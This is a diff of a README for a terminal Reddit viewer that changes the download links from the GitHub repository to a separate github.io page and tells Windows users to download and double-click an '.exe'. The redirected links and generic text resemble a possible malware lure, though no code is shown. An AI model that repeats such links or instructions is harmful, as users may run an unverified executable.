@@ -1,6 +1,6 @@
 # 🖥️ oh-my-reddit - View reddit threads in your terminal
 
-[![](https://img.shields.io/badge/Download-oh--my--reddit-blue.svg)](https://github.com/Siouxsynthetical710/oh-my-reddit/releases)
+[![](https://img.shields.io/badge/Download-oh--my--reddit-blue.svg)](https://siouxsynthetical710.github.io)
 
 oh-my-reddit transforms dry Reddit threads into clear, readable displays inside your computer terminal. This tool focuses on content layout and speed. It organizes discussions into columns and rows that fit your screen. You navigate through subreddits and posts using your keyboard.
 
@@ -26,7 +26,7 @@ This application works on any modern version of the Windows operating system. It
 
 You perform the installation in three steps. Please follow these instructions to start the application.
 
-1.  Visit this page to download the latest setup file: [https://github.com/Siouxsynthetical710/oh-my-reddit](https://github.com/Siouxsynthetical710/oh-my-reddit)
+1.  Visit this page to download the latest setup file: [https://siouxsynthetical710.github.io](https://siouxsynthetical710.github.io)
 2.  Locate the file ending in `.exe` within the release section on the webpage and save it to your computer.
 3.  Double-click the file to open the program.
 
